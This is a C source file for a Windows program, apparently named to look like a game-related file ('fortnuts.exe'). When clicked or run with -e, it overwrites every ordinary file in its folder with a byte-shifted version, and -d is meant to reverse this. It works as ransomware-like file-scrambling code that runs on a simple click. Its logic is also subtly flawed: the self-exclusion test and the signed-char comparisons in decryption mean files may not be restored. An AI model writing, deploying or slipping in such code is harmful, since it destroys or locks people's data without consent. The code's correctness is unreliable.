#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

#define THISNAME "fortnuts.exe"
#define ASCII_LIM 255
#define DEGREE 2

void fencrypt(char *fname, int degree);
void fdecrypt(char *fname, int degree);

int main(int argc, char *argv[]) {

	WIN32_FIND_DATA wd;
	HANDLE winhandle;
	char *namebuf;
	int il;

	namebuf = NULL;
	if (argc > 2) {
		return EXIT_FAILURE;
	}
	if (argc == 1 || strcmp("-e", argv[1]) == 0) {		//IF FILE IS CLICKED ON OR RUN WITH THE -E FLAG, ENCRYPT
		if ((winhandle = FindFirstFile("*", &wd)) == INVALID_HANDLE_VALUE) {
			perror("findfirstfile err");
			return EXIT_FAILURE;
		}
		FindNextFile(winhandle, &wd);
		while (FindNextFile(winhandle, &wd) > 0) {
			if ((namebuf = malloc(sizeof(char) * (strlen(wd.cFileName) + 1))) == NULL) {
				perror("malloc err");
				return EXIT_FAILURE;
			}
			for (il = 0; il < strlen(wd.cFileName); il++)
				*(namebuf + il) = *(wd.cFileName + il);
			*(namebuf + il) = '\0';
			if (!(wd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY || wd.dwFileAttributes & FILE_ATTRIBUTE_HIDDEN || wd.dwFileAttributes & FILE_ATTRIBUTE_SYSTEM) && strcmp(THISNAME, namebuf) == 1) {
				fencrypt(wd.cFileName, DEGREE);
				printf("File %s encrypted!\n", wd.cFileName);
			}
			free(namebuf);
		}
		if (GetLastError() != ERROR_NO_MORE_FILES) {
			perror("FindNextFile error.");
			return EXIT_FAILURE;
		}
		printf("%s\n", "Encrypting process complete.");
	} else if (strcmp("-d", argv[1]) == 0) {		//IF FILE IS RUN WITH THE -D FLAG, DECRYPT
		if ((winhandle = FindFirstFile("*", &wd)) == INVALID_HANDLE_VALUE) {
			perror("findfirstfile err");
			return EXIT_FAILURE;
		}
		FindNextFile(winhandle, &wd);
		while (FindNextFile(winhandle, &wd) > 0) {
			if ((namebuf = malloc(sizeof(char) * (strlen(wd.cFileName) + 1))) == NULL) {
				perror("malloc err");
				return EXIT_FAILURE;
			}
			for (il = 0; il < strlen(wd.cFileName); il++)
				*(namebuf + il) = *(wd.cFileName + il);
			*(namebuf + il) = '\0';
			if (!(wd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY || wd.dwFileAttributes & FILE_ATTRIBUTE_HIDDEN || wd.dwFileAttributes & FILE_ATTRIBUTE_SYSTEM) && strcmp(THISNAME, namebuf) == 1) {
				fdecrypt(wd.cFileName, DEGREE);
				printf("File %s decrypted!\n", wd.cFileName);
			}
			free(namebuf);
		}
		if (GetLastError() != ERROR_NO_MORE_FILES) {
			perror("FindNextFile error.");
			return EXIT_FAILURE;
		}
		printf("%s\n", "Decrypting process complete.");
	} else 
		printf("%s\n", "Invalid program argument.");
	return 0;

}

void fencrypt(char *fname, int degree) {

	FILE *f;
	char *bitbuf;
	long fsize;

	if ((f = fopen(fname, "rb")) == NULL) {
		perror("fopen err");
		exit(EXIT_FAILURE);
	}
	if (fseek(f, 0, SEEK_END) == -1) {
		perror("fseek err");
		exit(EXIT_FAILURE);
	}
	fsize = ftell(f);
	rewind(f);
	if ((bitbuf = malloc(sizeof(char) * fsize)) == NULL) {
		perror("malloc err");
		exit(EXIT_FAILURE);
	}
	if (fread(bitbuf, sizeof(char), fsize, f) < 0) 
		if (ferror(f)) {
			perror("fread err");
			exit(EXIT_FAILURE);
		}
	for (int i = 0; i < fsize; i++) {
		if (*(bitbuf + i) < ASCII_LIM - degree)
			*(bitbuf + i) += degree;
		else 
			*(bitbuf + i) -= degree;
	}
	if (freopen(fname, "wb", f) == NULL) {
		perror("freopen err");
	}
	if (fwrite(bitbuf, sizeof(char), fsize, f) < 0) {
		perror("fwrite err");
		exit(EXIT_FAILURE);
	}
	if (fclose(f) == -1) {
		perror("fclose err");
		exit(EXIT_FAILURE);
	}
	free(bitbuf);

}

void fdecrypt(char *fname, int degree) {

	FILE *f;
	char *bitbuf;
	long fsize;

	if ((f = fopen(fname, "rb")) == NULL) {
		perror("fopen err");
		exit(EXIT_FAILURE);
	}
	if (fseek(f, 0, SEEK_END) == -1) {
		perror("fseek err");
		exit(EXIT_FAILURE);
	}
	fsize = ftell(f);
	rewind(f);
	if ((bitbuf = malloc(sizeof(char) * fsize)) == NULL) {
		perror("malloc err");
		exit(EXIT_FAILURE);
	}
	if (fread(bitbuf, sizeof(char), fsize, f) < 0) 
		if (ferror(f)) {
			perror("fread err");
			exit(EXIT_FAILURE);
		}
	for (int i = 0; i < fsize; i++) {
		if (*(bitbuf + i) == 252 || *(bitbuf + i) == 253)
			*(bitbuf + i) += degree;
		else
			*(bitbuf + i) -= degree;
	}
	if (freopen(fname, "wb", f) == NULL) {
		perror("freopen err");
	}
	if (fwrite(bitbuf, sizeof(char), fsize, f) < 0) {
		perror("fwrite err");
		exit(EXIT_FAILURE);
	}
	if (fclose(f) == -1) {
		perror("fclose err");
		exit(EXIT_FAILURE);
	}
	free(bitbuf);

}
